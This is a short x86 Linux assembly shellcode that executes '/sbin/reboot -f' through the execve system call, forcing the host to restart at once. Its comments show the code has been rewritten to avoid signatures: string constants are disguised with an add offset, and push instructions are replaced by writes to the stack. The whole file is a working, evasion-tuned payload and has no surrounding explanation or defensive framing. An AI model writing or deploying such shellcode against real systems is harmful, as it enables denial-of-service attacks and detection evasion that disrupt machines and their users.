global _start
section .text
  _start:
    ; zero out eax
    xor    eax,eax

    push   eax        ; place 0x00000000 on the stack

    ;push   0x746f6f62 ; push toob to the stack
    mov ebx, 0x736e6e61 ; place obfuscated toob in ebx
    add ebx, 0x01010101 ; add to bring ebx to 0x746f6f62
    push ebx ; push toob to the stack

    ;push   0x65722f6e ; push er/n to the stack
    ;push   0x6962732f ; push ibs/ to the stack
    mov dword [esp-4],  0x65722f6e ; push er/n to the stack
    mov dword [esp-8], 0x6962732f ; push ibs/ to the stack
    sub esp, 8

    mov    ebx,esp    ; place pointer to /sbin/reboot string on stack
    push   eax        ; place 0x00000000 on the stack
    push word 0x662d  ; push f- to the stack
    mov    esi,esp    ; place pointer to -f argument to the stack
    push   eax        ; push 0x00000000 on the stack
    push   esi        ; place pointer to -f argument on the stack
    push   ebx        ; place pointer to /sbin/reboot string on the stack
    mov    ecx,esp    ; move pointer to argument array /sbin/reboot, -f on the stack

    mov    al,0xb     ; place system call 11 (execve) in al

    int    0x80       ; call execve

